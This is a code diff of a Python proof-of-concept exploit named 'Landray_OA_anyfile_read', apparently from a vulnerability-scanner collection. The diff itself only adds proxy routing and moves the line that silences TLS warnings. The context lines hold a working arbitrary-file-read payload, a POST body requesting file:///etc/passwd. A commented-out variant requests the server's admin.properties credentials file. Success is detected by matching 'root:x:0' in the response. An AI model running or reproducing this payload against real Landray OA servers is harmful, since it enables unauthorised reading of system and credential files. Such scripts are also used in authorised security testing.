@@ -2,10 +2,12 @@
 # _*_ coding:utf-8 _*_
 
 import requests
+
+from Config.config_proxies import proxies
 from Config.config_requests import headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 
+requests.packages.urllib3.disable_warnings()
 ########################################################################################################################
 # 脚本信息
 NAME='Landray_OA_anyfile_read'
@@ -20,8 +22,8 @@ def poc(target):
     data = 'var={"body":{"file":"file:///etc/passwd"}}'
     # data = 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
+
+        r = requests.post(url=url,headers=headers,data=data,verify=False,timeout=3,proxies=proxies)
         if r.status_code == 200 and "root:x:0" in r.text:
             result["target"] = target
             result["poc"] = NAME
